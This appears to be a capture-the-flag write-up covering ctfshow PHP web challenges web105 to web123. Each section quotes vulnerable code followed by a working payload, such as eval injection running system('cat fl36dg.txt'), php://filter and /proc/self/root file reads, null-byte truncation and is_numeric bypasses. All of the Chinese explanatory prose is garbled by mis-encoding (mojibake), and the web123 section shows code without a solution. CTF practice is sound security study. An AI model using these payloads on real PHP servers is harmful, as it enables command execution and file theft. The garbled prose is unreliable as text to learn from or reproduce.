<p>è¿™é‡Œå°†æˆ‘ä»¬ç”¨GETæ–¹å¼ä¼ å…¥çš„å‚æ•°å½“æˆKEYï¼Œå‚æ•°çš„å€¼ä½œä¸ºVALUE</p>
<p>æœ€åè¿™é‡Œ <code>$$key=$$value;</code> è¿™é‡Œkeyä¸èƒ½ç­‰äºerrorï¼Œäºæ˜¯</p>
<p>æˆ‘ä»¬ä¼ å…¥ <code>suces=flag</code></p>
<p>è¿™æ · <code>$suces=$flag</code>è¿™é‡Œæˆ‘ä»¬æˆåŠŸå°†flagçš„å€¼ä¼ ç»™äº†sucesï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å†å°†secesçš„å€¼ä¼ ç»™error</p>
<p>åŒç†ï¼Œæˆ‘ä»¬ç”¨postæ–¹å¼ä¼ å…¥ <code>error=suces</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$errot=$suces=$flag</span><br></pre></td></tr></table></figure>

<p>æœ€åç”±äºä¸æˆç«‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class="line">    die($error); </span><br></pre></td></tr></table></figure>

<p>å°†erroræ‰“å°å‡ºæ¥ï¼Œæ­¤æ—¶errorçš„å€¼å°±æ˜¯flag</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?suces=flag</span><br><span class="line"></span><br><span class="line">POST:error=suces</span><br></pre></td></tr></table></figure>



<h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line">    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ•°ç»„ç»•è¿‡ï¼Œè¿™é‡Œä¸é‡å¤è®²äº†ã€‚ã€‚</p>
<h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;v1&#x27;]))&#123;</span><br><span class="line">    $v1 = $_POST[&#x27;v1&#x27;];</span><br><span class="line">    $v3 = $_GET[&#x27;v3&#x27;];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;</span><br><span class="line">           echo $flag;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><code>parse_str</code></p>
<blockquote>
<p><strong>parse_str</strong> ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>
<p>å¦‚æœ <code>encoded_string</code> æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery stringï¼‰ï¼Œåˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† <code>result</code> åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰ã€‚</p>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬ä¼ å…¥v3&#x3D;flag</p>
<p><code>v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</code>ï¼ˆå…¶å®å°±æ˜¯flagç»è¿‡md5åçš„å€¼ï¼‰</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v3=flag</span><br><span class="line">POST:v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc</span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ç§æ€è·¯ md5ä¸€ä¸ªæ•°ç»„çš„å€¼ä¸ºnullï¼Œå¦‚æœv2è¿™ä¸ªæ•°ç»„ä¸­çš„flagå€¼ä¹Ÿä¸ºnullï¼Œnull&#x3D;&#x3D;null</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v3[]=</span><br><span class="line">POST:V1=</span><br></pre></td></tr></table></figure>



<h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;</span><br><span class="line">    die(&#x27;error&#x27;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><br><span class="line">if(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶å®è¿™ä¸ªé¢˜å°±è€ƒäº†ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<p>eregå‡½æ•°å¯ä»¥ç”¨%00æˆªæ–­</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure>



<h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123;</span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­£åˆ™åŒ¹é…è¦æ±‚v1å’Œv2è¦åŒ…å«å­—æ¯ã€‚é¢˜ç›®ä¸­evalé‡Œçš„è¯­å¥ï¼Œå’Œä¹‹å‰web101æœ‰ç‚¹ç›¸ä¼¼ã€‚<br>åˆå§‹åŒ–$v1ï¼Œv1æ˜¯ä¸ªç±»ï¼Œ$v2()æ˜¯å‚æ•°ã€‚</p>
<p>è¿™é“é¢˜ç”¨åˆ°äº†é­”æœ¯æ–¹æ³•__toString()ï¼Œä¸å°‘phpçš„å†…ç½®ç±»é‡Œéƒ½åŒ…å«æœ‰è¿™ä¸ªæ–¹æ³•ï¼Œå¦‚Reflectionclassã€Exceptionã€Error<br><code>__toString()</code>ï¼šå½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¯¹å¾…çš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ ¼å¼åŒ–è¾“å‡ºè¿™ä¸ªå¯¹è±¡æ‰€åŒ…å«çš„æ•°æ®ã€‚</p>
<blockquote>
<p>PHP5.2.0ä¹‹å‰ï¼Œ__toString() æ–¹æ³•åªåœ¨ä½¿ç”¨ echo æˆ– print æ—¶æ‰ç”Ÿæ•ˆã€‚PHP5.2.0ä¹‹åï¼Œå¯ä»¥åœ¨ä»»ä½•å­—ç¬¦ä¸²ç¯å¢ƒç”Ÿæ•ˆ</p>
</blockquote>
<p>æ‰€ä»¥echoä½¿å¾—<code>$v1</code>ç±»è§¦å‘<code>__toString()</code>ï¼Œä¼ é€’çš„å‚æ•°v2ä¼šè¢«è¾“å‡ºã€‚</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=CachingIterator&amp;v2=system(ls)</span><br><span class="line">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure>



<h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    eval(&quot;echo new $v1($v2());&quot;);</span><br><span class="line"></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ä»¥ä½¿ç”¨FilesystemIteratoræ–‡ä»¶ç³»ç»Ÿè¿­ä»£å™¨æ¥è¿›è¡Œåˆ©ç”¨ï¼Œé€šè¿‡æ–°å»ºFilesystemIteratorï¼Œä½¿ç”¨getcwd()æ¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾fl36dga.txt</p>
<p>è®¿é—®url&#x2F;fl36dga.txtå¾—åˆ°flag</p>
<p>å…¶å®è¿™é‡Œçš„<code>FilesystemIterator</code>æ²¡å’‹å¼„æ‡‚ï¼Œè¿˜éœ€è¦æ‰¾å¸ˆå‚…è¯·æ•™ä¸€ä¸‹</p>
<p>åç»­</p>
<p>ç¨å¾®æ‡‚äº†ä¸€ç‚¹</p>
<blockquote>
<p>é€šè¿‡æ–°å»ºFilesystemIteratorï¼Œå¯ä»¥æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ç»“æ„ã€‚ç”±äºå‚æ•°å†…éƒ¨æœ‰ä¸ªæ‹¬å·ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨å­—ç¬¦ä¸²æ¥ç´¢å¼•è·¯å¾„ï¼Œè€Œæ˜¯è¦é€šè¿‡æ‹¼æ¥æ–¹æ³•getcwd()æ¥è·å–å½“å‰çš„è·¯å¾„</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	echo getcwd().PHP_EOL;</span><br><span class="line">	echo new FilesystemIterator(&#x27;./&#x27;).PHP_EOL;</span><br><span class="line">	echo new FilesystemIterator(getcwd());</span><br><span class="line">?&gt;</span><br><span class="line">è¾“å‡ºä¸º</span><br><span class="line">D:\PHP</span><br><span class="line">  index.php</span><br><span class="line">  index.php</span><br></pre></td></tr></table></figure>



<h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br></pre></td></tr></table></figure>

<p>å½“v1ä¼ å…¥ctfshowï¼Œæ‰§è¡ŒgetFlagå‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯$ctfshow&#x3D;$$v2,ç„¶åå°†$$v1æ‰“å°å‡ºæ¥</p>
<p>æˆ‘ä»¬å¦<code>v2=GLOBALS</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>



<h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>is_file</code></p>
<blockquote>
<p>åˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ã€‚</p>
</blockquote>
<p>is_fileç”¨phpä¼ªåè®®å³å¯ç»•è¿‡</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>



<h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é¢˜è¿‡æ»¤æ‰äº†filterï¼Œè¿™ä¸ªåè®®å°±ç”¨ä¸äº†ï¼Œè¿™é‡Œå¢åŠ ä¸€ç‚¹çŸ¥è¯†ç‚¹</p>
<p><strong>linuxé‡Œ<code>/proc/self/root</code>æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„</strong></p>
<p>ä¹Ÿå°±æ˜¯å¦‚æœåœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥<code>ls /proc/self/root</code>ï¼Œå…¶å®æ˜¾ç¤ºçš„å†…å®¹æ˜¯æ ¹ç›®å½•ä¸‹çš„å†…å®¹</p>
<p>è¿™é‡Œæˆ‘ä»¬å¤šæ¬¡é‡å¤å³å¯ç»•è¿‡<code>is_file</code></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>å¦ä¸€ç§è§£æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure>

<p>åº”è¯¥æ˜¯æŠŠflag.phpå½“æˆå‹ç¼©æ–‡ä»¶æ¥è¯»å–ï¼Œå…·ä½“çš„ä¸çŸ¥é“ã€‚</p>
<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;;</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>compress</code>å’Œ<code>root</code>è¢«banæ‰äº†ï¼Œ</p>
<p>å±±é‡æ°´å¤ç–‘æ— è·¯ï¼ŒæŸ³æš—èŠ±æ˜åˆä¸€æ‘</p>
<p><code>filter</code>æ²¡æœ‰ban</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>



<h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;; </span><br></pre></td></tr></table></figure>

<p><code>trim</code></p>
<blockquote>
<p> å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰</p>
<p> æœä¸æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ï¼Œ<strong>trim()</strong> å°†å»é™¤è¿™äº›å­—ç¬¦</p>
<ul>
<li>â€œ â€œ (ASCII <em>32</em> (<em>0x20</em>))ï¼Œæ™®é€šç©ºæ ¼ç¬¦ã€‚</li>
<li>â€œ\tâ€ (ASCII <em>9</em> (<em>0x09</em>))ï¼Œåˆ¶è¡¨ç¬¦ã€‚</li>
<li>â€œ\nâ€ (ASCII <em>10</em> (<em>0x0A</em>))ï¼Œæ¢è¡Œç¬¦ã€‚</li>
<li>â€œ\râ€ (ASCII <em>13</em> (<em>0x0D</em>))ï¼Œå›è½¦ç¬¦ã€‚</li>
<li>â€œ\0â€ (ASCII <em>0</em> (<em>0x00</em>))ï¼Œç©ºå­—èŠ‚ç¬¦ã€‚</li>
<li>â€œ\x0Bâ€ (ASCII <em>11</em> (<em>0x0B</em>))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚</li>
</ul>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬å†™äº†ä¸ªè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">for($i=1;$i&lt;=128;$i++)&#123;</span><br><span class="line">    $a=chr($i).&#x27;1&#x27;;</span><br><span class="line">    if(trim($a)!==&#x27;1&#x27;&amp;&amp;is_numeric($a))&#123;</span><br><span class="line">        echo urlencode(chr($i));</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€åè·‘å‡ºæ¥çš„ç»“æœæ˜¯ %0c(æ¢é¡µç¬¦)</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=%0c36</span><br></pre></td></tr></table></figure>



<h3 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

